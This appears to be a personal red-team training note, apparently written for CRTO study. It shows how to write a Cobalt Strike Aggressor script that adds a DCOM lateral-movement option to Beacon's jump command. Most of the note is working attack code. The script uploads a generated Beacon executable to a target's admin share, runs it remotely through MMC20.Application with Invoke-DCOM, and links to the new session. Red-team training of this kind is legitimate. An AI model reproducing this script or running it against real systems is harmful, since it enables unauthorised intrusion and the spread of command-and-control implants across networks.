
Aggressor can be used to register new techniques under `jump` and `remote-exec` using [beacon_remote_exploit_register](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_remote_exploit_register) and [beacon_remote_exec_method_register](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_remote_exec_method_register) respectively.

In this example, we'll integrate `Invoke-DCOM.ps1` into `jump`.  

1) First, create a new text file in Visual Studio and save is somewhere as `dcom.cna`.  Then add the following skeleton.

```
sub invoke_dcom
{
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```

  

This will register "dcom" as a new option inside the jump command and specifies `invoke_dcom` as the associated callback function.  The first thing to add inside this callback are some local variable declarations.
```
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```

`local` defines variables that are local to the current function, so they will disappear once executed.  Sleep can have `global`, `closure-specific` and `local` scopes.  More information can be found in **5.2 Scalar Scope** of the Sleep manual.

The next step is to acknowledge receipt of the task using [btask](https://download.cobaltstrike.com/aggressor-script/functions.html#btask).  This takes the ID of the Beacon, the text to post and an ATT&CK tactic ID.  This will print a message to the Beacon console and add it to the data model used in the activity and session reports that you can generate from Cobalt Strike.
```
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');

    # acknowledge this command
    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");
}
```
  

You'll notice `$1`, `$2` and `$3` variables here which are automatically passed in by the client.  Where:
```
- $1 is the Beacon ID.
- $2 is the target to jump to.
- $3 is the selected listener.
```
  

Furthermore, [listener_describe](https://download.cobaltstrike.com/aggressor-script/functions.html#listener_describe) expands a listener name into a more detailed description.  For example, instead of "smb" it will say "windows/beacon_bind_pipe (\\.\pipe\<pipename>)".

Next, we want to read in the Invoke-DCOM script from our machine.  This can be done [openf](http://sleep.dashnine.org/manual/openf.html), [getFileProper](http://sleep.dashnine.org/manual/getFileProper.html) and [script_resource](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#script_resource).  Notice how we're assigning values to the variables we declared at the start.
```
$handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
$script = readb($handle, -1);
closef($handle);
```
  

The `$script` variable now holds the raw content of Invoke-DCOM.ps1.  For Beacon to utilise it, we can use [beacon_host_script](https://download.cobaltstrike.com/aggressor-script/functions.html#beacon_host_script) - this will host the script inside Beacon and returns a short snippet for running it.

```
$oneliner = beacon_host_script($1, $script);
```
  If you want to see the content of these variables, you can use `println($oneliner);` and they'll appear in the Script Console (_Cobalt Strike > Script Console_).

  The next step is to generate and upload a payload to the target using [artifact_payload](https://download.cobaltstrike.com/aggressor-script/functions.html#artifact_payload)and [bupload_raw](https://download.cobaltstrike.com/aggressor-script/functions.html#bupload_raw).  This will generate an EXE payload and upload it to the target in the `C:\Windows\Temp` directory.

`$payload = artifact_payload($3, "exe", "x64");`

`bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);`

  `$+` concatenates an interpolated string and requires additional whitespaces on each end.

Then, [bpowerpick](https://download.cobaltstrike.com/aggressor-script/functions.html#bpowerpick) can execute the Invoke-DCOM oneliner.  We pass it the target computer name and the path to the uploaded payload.  Also, because this could be a P2P payload - we want to automatically try and link to it, which can be done with [beacon_link](https://download.cobaltstrike.com/aggressor-script/functions.html#beacon_link).

`bpowerpick!($1, "Invoke-DCOM -ComputerName $+ $2 $+ -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);
`
Finally, automatic link:
`beacon_link($1, $2, $3);
`



### Properties
---
📆 created   {{06-03-2024}} 15:21
🏷️ tags: #redteam #crto 

---

